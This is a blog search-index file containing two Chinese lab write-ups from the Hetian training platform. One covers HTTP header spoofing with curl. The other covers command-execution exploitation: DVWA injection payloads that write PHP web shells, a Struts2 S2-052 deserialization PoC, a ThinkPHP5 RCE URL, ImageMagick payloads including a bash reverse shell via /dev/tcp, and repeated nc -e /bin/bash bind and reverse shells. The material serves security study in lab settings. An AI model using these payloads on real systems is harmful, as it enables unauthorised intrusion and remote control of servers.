<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>合天培训_实验_web安全之HTTP头部字段理解</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p>
<a id="more"></a>

<h2 id="第一题-观察HTTP-响应头"><a href="#第一题-观察HTTP-响应头" class="headerlink" title="第一题 观察HTTP 响应头"></a>第一题 观察HTTP 响应头</h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure>

<p>得到:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure>

<h2 id="第二题-Referer理解"><a href="#第二题-Referer理解" class="headerlink" title="第二题 Referer理解"></a>第二题 Referer理解</h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p>
<p>通过命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure>

<p>从响应中获取key:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<h2 id="第三题-X-Forwarded-For理解"><a href="#第三题-X-Forwarded-For理解" class="headerlink" title="第三题 X-Forwarded-For理解"></a>第三题 X-Forwarded-For理解</h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure>

<p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<h2 id="第四题-User-Agent理解"><a href="#第四题-User-Agent理解" class="headerlink" title="第四题 User-Agent理解"></a>第四题 User-Agent理解</h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure>

<p>得到key:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure>

<p>第五题 Accept-Language理解</p>
<p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure>

<h2 id="第六题-Cookie理解"><a href="#第六题-Cookie理解" class="headerlink" title="第六题 Cookie理解"></a>第六题 Cookie理解</h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>

<p>发现响应头中会设置cookie:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure>

<p>所以请求时将cookie设置为Login=admin即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训_实验_命令执行</title>
    <url>/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的<strong>PHP代码执行函数</strong>分析。（3）能执行系统命令的<strong>系统命令执行函数</strong>分析</p>
<a id="more"></a>

<h2 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1. 命令执行漏洞"></a>1. 命令执行漏洞</h2><p>（1）实验介绍</p>
<p>实验链接： <a href="http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=39594afc-5c80-4d51-8f99-7cb54e20b401</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 通过实验理解命令实验漏洞的原理和利用方法。 </p>
<p>（2）实验操作</p>
<p>1）该实验是DVWA命令执行漏洞实验，先打开10.1.1.174然后输入账号密码进去，查看安全等级发现是high，将其设置成low。然后开始命令执行测试。</p>
<p>2）正常业务。发现在命令执行处可以输入ip地址，然后可以得到ping ip后的结果。</p>
<p>尝试127.0.0.1</p>
<p><img src="/assets/image-20200426123935628.png" alt="image-20200426123935628"></p>
<p>3）fuzz测试。可以进行命令执行fuzz测试，发现很多符号都没被过滤。所以可以尝试攻击。</p>
<p>4）构造payload</p>
<ul>
<li><p>127.0.0.1 | net user          查看用户</p>
<p><img src="/assets/image-20200426124613975.png" alt="image-20200426124613975"></p>
</li>
<li><p>127.0.0.1 | echo “<?php phpinfo; ?>“ &gt; 1.php        写php文件</p>
</li>
</ul>
<p><img src="/assets/image-20200426125031831.png" alt="image-20200426125031831"></p>
<ul>
<li>127.0.0.1 | echo “<?php @eval($_POST['cmd']); ?>“ &gt; shell.php 写shell</li>
</ul>
<p>用菜刀连接</p>
<p><img src="/assets/image-20200426125304313.png" alt="image-20200426125304313"></p>
<p><img src="/assets/image-20200426125326981.png" alt="image-20200426125326981"></p>
<p>由于实验机里没有nc工具就不尝试反弹shell了。</p>
<p>5)medium难度操作</p>
<p>通过fuzz发现&amp;&amp;和;被过滤了。</p>
<ul>
<li>127.0.0.1;dir</li>
</ul>
<p><img src="/assets/image-20200426130010047.png" alt="image-20200426130010047"></p>
<ul>
<li><p>127.0.0.1 &amp;&amp; dir</p>
<p><img src="/assets/image-20200426130102921.png" alt="image-20200426130102921"></p>
</li>
</ul>
<p>但是因为过滤不全所以可以用其他符号可以绕过，比如low中用的|</p>
<p>如果非要用&amp;&amp;可以使用下面方式：</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> &amp;;&amp; dir</span><br></pre></td></tr></table></figure>

<p>所以medium存在问题是使用黑名单，且黑名单机制不全。</p>
<h2 id="2-CVE-2017-9805Struts2-052漏洞实验"><a href="#2-CVE-2017-9805Struts2-052漏洞实验" class="headerlink" title="2. CVE-2017-9805Struts2-052漏洞实验"></a>2. CVE-2017-9805Struts2-052漏洞实验</h2><p>（1）实验介绍</p>
<p>实验链接：  <a href="http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=c9b7ee13-33d3-4317-b31c-c9a80a8ad0a2</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 了解S2-052 Struts2远程命令执行漏洞危害；掌握检测利用S2-052 Struts2远程命令执行漏洞技术</p>
<p>（2）实验操作</p>
<p>1）搭建实验环境。</p>
<p>tomcat开启。下载软件源代码，部署war文件。打开  <a href="http://127.0.0.1:8080/struts2-rest-showcase" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase</a> 网站进行测试，成功显示，环境搭建成功。然后配置burp进行抓包，注意tomcat默认端口为8080，所以burp可以改为8090端口。</p>
<p>2）正常业务</p>
<p>点击edit，随便输入内容提交，成功提交。</p>
<p>3）poc测试</p>
<p><img src="/assets/image-20200426141646790.png" alt="image-20200426141646790"></p>
<p>发现报错500，rce成功。而且弹出了计算器。</p>
<p>4）漏洞分析</p>
<p>XStreamHandler这个类对http请求中content-type是application/xml的，调用XStream进行处理。而XStreamHandler中的toObject()方法未对传入的值进行任何限制，导致XStream反序列化转化为对象时任意代码执行。</p>
<p>5）poc分析</p>
<p>poc:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span> <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span> <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span> <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</span> <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">"javax.crypto.NullCipher"</span>&gt;</span> <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span> <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span> <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</span> <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">"java.util.Collections$EmptyIterator"</span>/&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span> <span class="tag">&lt;<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">string</span>&gt;</span>cacl<span class="tag">&lt;/<span class="name">string</span>&gt;</span> <span class="tag">&lt;/<span class="name">command</span>&gt;</span> <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span> <span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">iter</span>&gt;</span> <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">"javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span> <span class="tag">&lt;<span class="name">method</span>&gt;</span> <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span> <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span> <span class="tag">&lt;/<span class="name">method</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span> <span class="tag">&lt;/<span class="name">filter</span>&gt;</span> <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">"string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span> <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span> <span class="tag">&lt;<span class="name">lock</span>/&gt;</span> <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span> <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span> <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span> <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span> <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span> <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span> <span class="tag">&lt;/<span class="name">is</span>&gt;</span> <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span> <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span> <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span> <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span> <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span> <span class="tag">&lt;/<span class="name">value</span>&gt;</span> <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">entry</span>&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span> <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>





<p>poc看不懂，分析是传入xml文件，估计下面语句</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&lt;command&gt;</span><span class="symbol">&lt;string&gt;</span>C:\Windows\System32\calc.<span class="keyword">exe</span>&lt;/<span class="built_in">string</span>&gt;&lt;/<span class="keyword">command</span>&gt;</span><br></pre></td></tr></table></figure>

<p>被当作命令执行。</p>
<h2 id="3-Thinkphp5-远程命令执行漏洞"><a href="#3-Thinkphp5-远程命令执行漏洞" class="headerlink" title="3. Thinkphp5 远程命令执行漏洞"></a>3. Thinkphp5 远程命令执行漏洞</h2><p>（1）实验介绍</p>
<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的： 通过该实验了解ThinkPHP5远程命令执行漏洞的原因和利用方法，以及如何修复该漏洞。 </p>
<p>（2）实验操作</p>
<p>1）安装环境。</p>
<ul>
<li>利用<code>netstat -tunlp</code>检测是否开启AMP。注意php端口为9000。</li>
<li>下载ThinkPhp源码，并部署到apache的web目录下。换机器测试发现成功安装。</li>
</ul>
<p>2）实验操作</p>
<p>直接利用实验里带的ThinkPHP5漏洞检测工具。</p>
<p><img src="/assets/image-20200426144136346.png" alt="image-20200426144136346"></p>
<p>发现poc。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request\<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>



<p>测试</p>
<p><img src="/assets/image-20200426144439093.png" alt="image-20200426144439093"></p>
<p>发现正确。然后getshell.</p>
<p><img src="/assets/image-20200426144235821.png" alt="image-20200426144235821"></p>
<p>3）漏洞分析</p>
<p>a. $this-&gt;config-&gt;get(‘var_pathinfo’)是配置文件的默认值，初始化值为s 。而pathinfo来自<code>$_GET[$this-&gt;config-&gt;get(&#39;var_pathinfo&#39;)]</code>，所以可以通过控制输入的参数s来控制pathinfo.</p>
<p>b. 特定条件下，path变量等于pathinfo控制。而path又被传入了router-&gt;check()函数，然后交给url解析。</p>
<p>c.解析url时，Url模块把url解析为三部分。模块/控制器/操作。而模块，控制器，操作都是可控的。</p>
<p>问题出在对控制器的处理中，如果发现控制器以反斜杠开始时，直接将其作为类名赋值给$class并返回，最后会实例化这个类。</p>
<p>e.Module.php中用param获取实例化类对应的参数，然后通过invokeMethod函数动态调用方法。</p>
<p>4）poc</p>
<p>poc不懂。。。</p>
<h2 id="4-ImageMagick漏洞"><a href="#4-ImageMagick漏洞" class="headerlink" title="4. ImageMagick漏洞"></a>4. ImageMagick漏洞</h2><p>（1）实验介绍</p>
<p>实验链接：   <a href="http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=78d1b399-298f-420a-9445-97774c98369f</a> </p>
<p>实验来源：合天网安实验室</p>
<p>实验目的：掌握ImageMagick命令执行漏洞产生的原因、利用方法以及修复方法</p>
<p>（2）实验操作</p>
<p>1）检查ImageMagick版本</p>
<p><img src="/assets/image-20200426165939722.png" alt="image-20200426165939722"></p>
<p>版本号为6.8.9.</p>
<p>2）漏洞测试</p>
<p>创建exploit.png,其内容为：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|ls "</span>-la)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p>利用convert生成新文件：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">convert</span> <span class="selector-tag">exploit</span><span class="selector-class">.png</span> <span class="selector-tag">out</span><span class="selector-class">.png</span></span><br></pre></td></tr></table></figure>

<p>可以发现成功执行了ls -a命令。证明存在命令执行漏洞。</p>
<p>3）漏洞利用</p>
<p>在另外台机器上，输入10.1.1.9访问目标服务器。先上传一个正常文件。</p>
<p><img src="/assets/image-20200426171311315.png" alt="image-20200426171311315"></p>
<p>发现是用的ImageMagick工具转换的。</p>
<p>先下载 nc，并在本地开启监听。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc.exe -nvlp <span class="number">12301</span></span><br></pre></td></tr></table></figure>



<p>上传一个可以弹shell的图片。图片内容：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill 'url(https://example.com/image.jpg<span class="string">"|bash -i &gt;&amp; /dev/tcp/10.1.1.2/12301 0&gt;&amp;1"</span>)'</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>

<p>上传后shell反弹成功。</p>
<p><img src="/assets/image-20200426172341563.png" alt="image-20200426172341563"></p>
<p>4）漏洞分析</p>
<p>ImageMagick对于每种格式文件都指定了一种委托，对于https形式的文件处理方式为：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="string">"wget"</span> -<span class="keyword">q</span> -O <span class="string">"%o"</span> <span class="string">"https:%M"</span></span><br></pre></td></tr></table></figure>

<p>而%M为输入的图片的url地址。由于是简单的字符串拼接，所以可以将引号闭合后通过管道符引入其他命令，形成了命令注入。</p>
<h2 id="5-web安全之命令执行漏洞理解"><a href="#5-web安全之命令执行漏洞理解" class="headerlink" title="5.web安全之命令执行漏洞理解"></a>5.web安全之命令执行漏洞理解</h2><h3 id="A-rce-ping"><a href="#A-rce-ping" class="headerlink" title="A.rce_ping"></a>A.rce_ping</h3><p>（1）正常业务</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>有回显。</p>
<p>（2）fuzz测试。</p>
<p>首先抓包</p>
<p><img src="/assets/image-20200426133832110.png" alt="image-20200426133832110"></p>
<p>发现有两个参数，一个参数一个命令。可以猜想可能使用了一些命令执行函数。比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>],<span class="variable">$return</span>);<span class="built_in">echo</span> <span class="variable">$return</span>;</span><br><span class="line"><span class="built_in">echo</span> system(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br><span class="line"><span class="built_in">echo</span> shell_exec(<span class="variable">$_POST</span>[<span class="string">'submit'</span>].<span class="string">" "</span>.<span class="variable">$_POST</span>[<span class="string">'ipaddress'</span>]);</span><br></pre></td></tr></table></figure>

<p>为了方便我们只对ipaddress这一选项进行fuzz测试。发现没有过滤。</p>
<p>（3）由于没有任何过滤所以直接写shell。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ipaddress</span>=127.0.0.1 | echo <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>['cmd']); ?&gt;"</span> &gt; shell.php &amp; <span class="attribute">submit</span>=ping</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426140144644.png" alt="image-20200426140144644"></p>
<p>尝试连接：</p>
<p><img src="/assets/image-20200426140329896.png" alt="image-20200426140329896"></p>
<p>发现失败，估计没有写的权限。</p>
<p>（4）尝试shell</p>
<p>a.正向shell</p>
<p>服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7777</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>本机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426173713380.png" alt="image-20200426173713380"></p>
<p>正向shell成功。</p>
<p>b.反弹shell</p>
<p>本机(自己的服务器)：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lk <span class="number">7777</span></span><br></pre></td></tr></table></figure>

<p>远程服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>发现反弹不成功。</p>
<p>换台服务器尝试</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | bash -i &gt;&amp; /dev/tcp/xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426174407176.png" alt="image-20200426174407176"></p>
<p>反弹shell成功。</p>
<h3 id="B-rce-ping-2"><a href="#B-rce-ping-2" class="headerlink" title="B.rce_ping_2"></a>B.rce_ping_2</h3><p>直接fuzz测试。</p>
<p><img src="/assets/image-20200426174750306.png" alt="image-20200426174750306"></p>
<p>发现<code>; &amp;&amp;</code>被过滤了。</p>
<p>直接正向shell测试。</p>
<p>服务器</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7778</span> -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>本机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p>
<h3 id="c-rce-ping-3"><a href="#c-rce-ping-3" class="headerlink" title="c.rce_ping_3"></a>c.rce_ping_3</h3><p>同样fuzz测试。</p>
<p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p>
<p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p>
<h3 id="D-rce-ping-4"><a href="#D-rce-ping-4" class="headerlink" title="D.rce_ping_4"></a>D.rce_ping_4</h3><p>页面500</p>
<h3 id="E-code"><a href="#E-code" class="headerlink" title="E.code"></a>E.code</h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
<h4 id="a-array-filter"><a href="#a-array-filter" class="headerlink" title="a.array_filter"></a>a.array_filter</h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
<p>（1）列出目录</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>

<p>成功列举目录</p>
<p>（2）写shell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">func</span>=system&amp;echo <span class="string">"&lt;?php <span class="variable">$_POST</span>[pass]&gt; ?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>发现还是不能上传shell???这里想探究下。</p>
<p><img src="/assets/image-20200426181415386.png" alt="image-20200426181415386"></p>
<p>当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。</p>
<p>(3)反弹shell。</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7781 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p>
<p>反弹成功。</p>
<h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map"></a>b. array_map</h4><p>array_map原型</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure>

<p>同样直接</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p>
<h4 id="c-assert"><a href="#c-assert" class="headerlink" title="c.assert"></a>c.assert</h4><p>assert原型</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p>
<h4 id="d-call-user-func"><a href="#d-call-user-func" class="headerlink" title="d.call_user_func"></a>d.call_user_func</h4><p>函数原型</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure>

<p>列举目录下文件：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p>
<h4 id="e-create-func"><a href="#e-create-func" class="headerlink" title="e.create_func"></a>e.create_func</h4><p>create_function ( string $args , string $code )</p>
<p>同样payload:</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>

<p>发现500了。。。。。。</p>
